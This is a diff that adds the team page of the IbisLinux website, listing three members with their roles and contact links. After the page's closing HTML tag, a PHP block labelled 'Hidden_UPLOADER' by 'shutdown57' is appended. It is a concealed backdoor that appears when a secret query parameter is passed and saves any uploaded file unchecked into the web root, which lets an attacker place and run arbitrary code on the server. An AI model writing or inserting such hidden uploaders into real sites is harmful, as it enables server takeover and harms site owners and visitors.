@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="SHORTCUT ICON" href="img/single.png">
+<title>IbisLinux | Lightweight and Elegant Linux® distribution</title>
+<!-- Meta tag looking for mobile devices -->
+<meta name="viewport" content="initial-scale=1.5">
+<meta name="theme-color" content="#232323">
+
+<!-- Good information about this page -->
+<meta name="description" content="Lightweight and Elegant Linux® distribution">
+<meta name="keywords" content="Ibis, IbisLinux, Linux Distro">
+<meta name="author" content="Tanio">
+
+<!-- Facebook, Linkedin, Reddit and many others Open Graph -->
+<meta property="og:site_name" content="IbisLinux" />
+<meta property="og:title" content="IbisLinux | Lightweight and Elegant Linux® distribution" />
+<meta property="og:type" content="website" />
+<meta property="og:description" content="IbisLinux | Lightweight and Elegant Linux® distribution" />
+<meta property="og:url" content="https://ibislinux.org" />
+<meta property="og:image:width" content="600" />
+<meta property="og:image:height" content="315" />
+<meta property="og:image" content="img/cover.jpg" />
+<meta property="og:locale" content="en" />
+<meta property="og:locale:alternate" content="pt_BR" />
+<meta property="fb:page_id" content="" />
+
+<!-- Style and scripts files -->
+<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
+<link rel="stylesheet" href="css/arta.css">
+<script src="js/highlight.min.js"></script>
+<script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.11.1.min.js"></script>
+
+<style type="text/css">
+img {
+    height: auto;
+    max-width: 640px;
+    -moz-transition: all 1s;
+    -ms-transition: all 1s;
+    -o-transition: all 1s;
+    -webkit-transition: all 1s;
+    transition: all 1s;
+}
+img.expanded {
+    max-width: 2000px;
+}
+</style>
+</head>
+<body>
+<div class="container col-md-10">
+<img src="img/wide.png" class="img-fluid mx-auto d-block" width="70%">
+<hr style="border-top: dotted 1px;margin-bottom:1px;" />
+<nav class="navbar navbar-dark bg-dark border-0 text-center">
+<span class="navbar-text mx-auto p">
+    <a href="./index.html" class="mr-2">Home</a>
+    <a href="https://blog.ibislinux.org/" class="mr-2">Blog</a>
+    <!-- <a href="about/" class="mr-2">About</a> -->
+    <a href="./about.html" class="mr-2">About</a>
+    <a href="./contact.html" class="mr-2">Contact</a>
+    <a href="./team.html" class="mr-2">Team</a>
+    <a href="./post.html" class="mr-2">Posts</a>
+    <a href="./get-ibislinux.html">Download</a>
+  </span>
+</nav>
+<hr style="border-top: dotted 1px;margin-top:1px;" />
+
+<div class="content">
+<h3 id="team">dev@ibislinux:~$ cat team.txt</h3>
+<p>This is our team that make ibislinux</p>
+<li id="author1">Mohammad Tanio | Tan
+<ul>
+<li>Ceo & Developer</li>
+<li><a href="mailto:root@ibislinux.org">root@ibislinux.org</a></li>
+<li><a href="https://tan.my.id/">tan.my.id</a></li>
+</ul>
+</li>
+<li id="author2" style="margin-top: 10px;">Mukhammad Akbar | Abay
+<ul>
+<li>Web Developer</li>
+<li><a href="mailto:abay@ibislinux.org">abay@ibislinux.org</a></li>
+<li><a href="https://abaykan.com/">abaykan.com</a></li>
+</ul>
+</li>
+<li id="author3" style="margin-top: 10px;">Abdi Prawira Negara | Abdi
+<ul>
+<li>Graphic Designer</li>
+<li><a href="mailto:abdi@ibislinux.org">abdi@ibislinux.org</a></li>
+<li><a href="https://keepwannabe.github.io/">keepwannabe.github.io</a></li>
+</ul>
+</li>
+<p>we are happy to accept what you contributed to ibislinux by sending e-mail to <a href="mailto:root@ibislinux.org">root@ibislinux.org</a></p>
+<hr style="border-top: dotted 1px;margin-bottom: 5px;" />
+<footer class="text-center">
+© 2018 | IbisLinux
+</footer>
+</div>
+<script>
+$(document).ready(function() {
+    var imageLinks = $('a[href$=".png"], a[href$=".jpg"], a[href$=".gif"], a[href$=".bmp"]');
+    if (imageLinks.children('img').length) {
+        imageLinks.children('img').each(function() {
+            var currentTitle = $(this).attr('title');
+            $(this).attr('title', currentTitle + ' (click to enlarge image)');
+        });
+        imageLinks.click(function(e) {
+            e.preventDefault();
+            $(this).children('img').toggleClass('expanded');
+        });
+    }
+});
+</script>
+<script src="js/custom.js"></script>
+</body>
+</html>
+<?php
+echo'
+<style>
+.none{
+	display:none;
+}
+</style>
+<form method="get">
+<input type="submit" name="up" class="none">
+</form>';
+if($_GET['up']){
+if(isset($_POST['btn']))
+{
+	$nama= $_FILES['wos']['name'];
+    $lokasi = $_FILES['wos']['tmp_name'];
+	$folder="";
+	if(move_uploaded_file($lokasi,$folder.$nama))
+	{
+echo'berhasil upload file :)';	}else{
+		echo'gagal upload file :';
+	}
+}
+echo'
+<!-- Uploader Script By Alinko A.K.A shutdown57 -->
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="keywords" content="Alinko,shutdown57">
+<meta name="viewport" content="width=width-device,initial-scale=1">
+<link rel="icon" href="http://alinko.pe.hu/css/logo.png">
+<title>Hidden_UPLOADER</title>
+</head>
+<body>
+ <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css"/>
+<center>
+<br><br><br><br><br><br><br>
+<h1>#~shutdown57 Hidden Uploader~#</h1>
+
+<fieldset><legend> Upload Here ;</legend>
+<form action="" method="post" enctype="multipart/form-data">
+<input type="file" name="wos"  />
+<button type="submit" name="btn" id="btn">upload !</button>
+</form></div>
+</fieldset>
+
+<!-- INI CSS :) -->
+<style>
+body{
+	background:#000;
+text-align: center;
+color:#00FF6D;
+}
+#kolom{
+color:#00FF6D;
+background: #333;
+border:2px solid #71FF00;
+Width:35%;
+Height:80px;
+font-family: Trade Winds;
+
+}
+#btn{
+color:#000;
+background: #00ff6d;
+border: 0;
+width:100%;
+height:30px;
+}
+#btn:hover{
+	transition-duration:0.4s;
+-o-transition-duration:0.4s;
+-moz-transition-duration:0.4s;
+-webkit-transition-duration:0.4s;
+background:#000;
+border:1px solid #00ff6d;
+color:#71ff00;
+}
+h1{
+font-family:Trade Winds;
+color:#333;
+text-shadow:0pt 0pt 10pt #00FF5D,0pt 0pt 20pt #71FF00,0pt 0pt 30pt #00FF6D;
+}
+
+</style>';
+}
+?>
